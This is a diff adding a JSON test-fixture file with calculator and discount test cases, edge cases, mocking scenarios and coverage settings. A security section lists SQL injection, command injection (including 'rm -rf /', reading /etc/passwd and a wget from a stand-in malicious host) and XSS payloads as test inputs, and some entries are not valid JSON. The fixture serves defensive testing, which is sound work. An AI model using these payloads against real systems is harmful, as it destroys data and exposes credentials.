@@ -1,0 +1,134 @@
+{
+  "test_cases": {
+    "calculator": {
+      "add": [
+        {"inputs": [2, 3], "expected": 5},
+        {"inputs": [-1, 1], "expected": 0},
+        {"inputs": [0.1, 0.2], "expected": 0.3}
+      ],
+      "divide": [
+        {"inputs": [10, 2], "expected": 5.0},
+        {"inputs": [1, 3], "expected": 0.3333333333333333},
+        {"inputs": [5, 0], "expected": "ValueError"}
+      ],
+      "factorial": [
+        {"inputs": [0], "expected": 1},
+        {"inputs": [5], "expected": 120},
+        {"inputs": [-1], "expected": "ValueError"}
+      ]
+    },
+    "discount": [
+      {"inputs": [100, 10], "expected": 90.0},
+      {"inputs": [50, 0], "expected": 50.0},
+      {"inputs": [100, 100], "expected": 0.0}
+    ]
+  },
+  "security_test_cases": {
+    "sql_injection": [
+      "'; DROP TABLE users; --",
+      "' OR '1'='1",
+      "admin'--",
+      "' UNION SELECT * FROM passwords--"
+    ],
+    "command_injection": [
+      "; rm -rf /",
+      "| cat /etc/passwd",
+      "&& wget malicious.com/script.sh",
+      "`whoami`"
+    ],
+    "xss_payloads": [
+      "<script>alert('XSS')</script>",
+      "javascript:alert('XSS')",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>"
+    ]
+  },
+  "edge_cases": {
+    "numeric": [
+      {"value": 0, "description": "Zero value"},
+      {"value": -1, "description": "Negative value"},
+      {"value": 1.7976931348623157e+308, "description": "Max float"},
+      {"value": 5e-324, "description": "Min positive float"},
+      {"value": "NaN", "description": "Not a number"},
+      {"value": "Infinity", "description": "Infinity"}
+    ],
+    "string": [
+      {"value": "", "description": "Empty string"},
+      {"value": " ", "description": "Whitespace only"},
+      {"value": "a" * 1000, "description": "Very long string"},
+      {"value": "🚀🎉", "description": "Unicode characters"},
+      {"value": "\n\t\r", "description": "Control characters"},
+      {"value": null, "description": "Null value"}
+    ],
+    "arrays": [
+      {"value": [], "description": "Empty array"},
+      {"value": [1], "description": "Single item"},
+      {"value": [1, 2, 3, 4, 5], "description": "Multiple items"},
+      {"value": [null, undefined], "description": "Array with null/undefined"}
+    ]
+  },
+  "performance_benchmarks": {
+    "small_dataset": {
+      "size": 100,
+      "expected_time_ms": 10
+    },
+    "medium_dataset": {
+      "size": 10000,
+      "expected_time_ms": 100
+    },
+    "large_dataset": {
+      "size": 1000000,
+      "expected_time_ms": 1000
+    }
+  },
+  "mocking_scenarios": {
+    "api_responses": {
+      "success": {
+        "status_code": 200,
+        "data": {"message": "Success"}
+      },
+      "error_4xx": {
+        "status_code": 404,
+        "data": {"error": "Not found"}
+      },
+      "error_5xx": {
+        "status_code": 500,
+        "data": {"error": "Internal server error"}
+      },
+      "timeout": {
+        "timeout": true
+      },
+      "network_error": {
+        "connection_error": true
+      }
+    },
+    "database_scenarios": {
+      "empty_result": [],
+      "single_result": [{"id": 1, "name": "Test"}],
+      "multiple_results": [
+        {"id": 1, "name": "Test1"},
+        {"id": 2, "name": "Test2"}
+      ],
+      "database_error": {
+        "error": "Connection failed"
+      }
+    }
+  },
+  "configuration": {
+    "test_timeouts": {
+      "unit": 5,
+      "integration": 30,
+      "e2e": 120
+    },
+    "coverage_targets": {
+      "minimum": 70,
+      "target": 85,
+      "excellent": 95
+    },
+    "quality_thresholds": {
+      "complexity": 10,
+      "maintainability": 80,
+      "technical_debt": 5
+    }
+  }
+}
